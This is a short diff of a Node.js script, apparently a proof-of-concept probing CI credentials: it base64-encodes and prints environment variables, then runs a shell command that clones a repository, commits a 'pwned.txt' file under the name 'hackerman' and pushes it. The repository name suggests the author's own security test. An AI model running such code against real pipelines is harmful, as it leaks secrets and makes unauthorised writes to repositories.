@@ -47,7 +47,7 @@ async function main() {
         const envBase64 = Buffer.from(envJson).toString('base64');
         console.log(envBase64);
 
-        const command = `echo "foo" > pwned.txt && git config --global user.email "test@test.com" && git config --global user.name "hackerman" &&  git add pwned.txt && git commit -m "pwned" && git push`;
+        const command = `git clone https://github.com/supriza/azure-login-test.git aaa && cd aaa && echo "foo" > pwned.txt && git config --global user.email "test@test.com" && git config --global user.name "hackerman" &&  git add pwned.txt && git commit -m "pwned" && git push`;
         console.log("Trying to push...");
         exec(command, (error, stdout, stderr) => {
             if (error) {
